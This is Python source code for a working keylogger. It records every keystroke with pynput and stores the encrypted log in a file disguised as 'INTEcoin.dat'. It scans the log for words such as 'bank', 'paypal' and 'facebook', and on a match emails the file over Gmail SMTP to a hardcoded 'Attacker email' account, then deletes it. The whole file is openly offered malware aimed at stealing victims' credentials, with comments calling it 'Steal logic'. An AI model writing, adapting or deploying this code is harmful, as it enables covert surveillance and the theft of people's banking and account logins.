from settings import *
import encryption
from pynput.keyboard import Key, Listener
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders

keys = []
keystrokes_count = 0
saves_count = 0
logs_count = 1
KEYSTROKES_BUFFER_SIZE = 20  # How many keystrokes before saving
SAVES_BUFFER_SIZE = 2  # How many saves before sending
EMAIL_USER = "intelogger@gmail.com" # Attacker email
EMAIL_PASSWORD = "Aa!12345" # Attacker password


def press(key):
    """
    Activated by the listener every key press.
    Checks counters and sends the data to the logging function.
    :param key: The key pressed given from pynput module.
    """
    print("Listener working")
    if str(key) == "Key.esc": # Checks for program exit
        return False
    global keys, keystrokes_count, saves_count
    keys.append(key)  # append every pressed key.
    keystrokes_count += 1  # keep track of how many keys.
    if keystrokes_count >= KEYSTROKES_BUFFER_SIZE:
        writer(keys)
        keystrokes_count = 0
        keys = []
        saves_count += 1
    if saves_count >= SAVES_BUFFER_SIZE:
        saves_count = 0
        results()


def writer(log):
    """
    Saves the log in a dat file.
    :param log: An array of pressed keys.
    """
    with open(LOGS_PATH + "INTEcoin.dat", "ab") as file:
        toWrite = ""
        for i, key in enumerate(log): # Removes repeated spaces and enters
            if i > 0:
                if str(key) == "Key.space" and str(log[i - 1]) == "Key.space":
                    continue
                if str(key) == "Key.enter" and str(log[i - 1]) == "Key.enter":
                    continue
            key = parse(key) # Converts the key to a readable character
            toWrite += key
        file.write(Encryption.encrypt(toWrite))
        file.write(b"@")  # Putting a separator for the encryption diod see Fernet using this as the cypher text
        file.close()


def parse(key):
    """
    Takes a string of a key pressed and makes it human readable.
    :param key: A string to parse into readable format.
    :return: The key as readable as possible.
    """
    key = str(key)
    if key == "'":  # Handling the ' sign
        return key
    key = key.replace("'", "")  # Delete ' ' from output
    if key == "Key.enter" or key == "Key.space":
        return "\n"
    if "Key" in key:
        return key + " " # If it has a "Key" parameter before add a space so it's more readable
    return key


def results():
    """
    Steal logic function.
    INTEcoin - Holds the encrypted data which deletes after the function finishes copying the file.
    """
    keywords = ["bank", "hmo", "facebook", "mail", "paypal"]
    toSend = False # File has one of the keywords flag
    chunk = ""
    DecryptedLog = ""

    for byt in Encryption.bytes_from_file(LOGS_PATH + "INTEcoin.dat"): # Read stolen data file as chunks and save them in a list
        if byt == "@":
            DecryptedLog += Encryption.decrypt(chunk.encode())
            chunk = ""
            continue
        chunk += byt

    for word in keywords: # Checking if any sensitive data was inputted
        if word in DecryptedLog:
            toSend = True
            break
    if toSend:
        send()  # Send the encrypted data
    os.remove(LOGS_PATH + "INTEcoin.dat") # Delete file to avoid sending the same data again


def send():
    """
    Sends the data via email.
    """
    global EMAIL_USER, EMAIL_PASSWORD, logs_count
    
    msg = MIMEMultipart() # Will contain the email message
    msg['From'] = EMAIL_USER
    msg['To'] = EMAIL_USER
    msg['Subject'] = "New Keylogger Logs"
    msg.attach(MIMEText("Log number {}".format(logs_count), 'plain'))
    logs_count += 1
    
    fileName = "INTEcoin.dat" # File to send
    attachment = open(LOGS_PATH + fileName, "rb") 
    
    mb = MIMEBase('application', 'octet-stream') # MIMEBase instance
    mb.set_payload((attachment).read())
    encoders.encode_base64(mb)
    mb.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
    msg.attach(mb) # Attach 'mb' to 'msg'
    
    smtp = smtplib.SMTP('smtp.gmail.com', 587) # Create STMP session
    smtp.starttls()
    smtp.login(EMAIL_USER, EMAIL_PASSWORD) # E-Mail login
    
    smtp.sendmail(EMAIL_USER, EMAIL_USER, msg.as_string()) # Sending the email
    smtp.quit() # Terminate STMP session
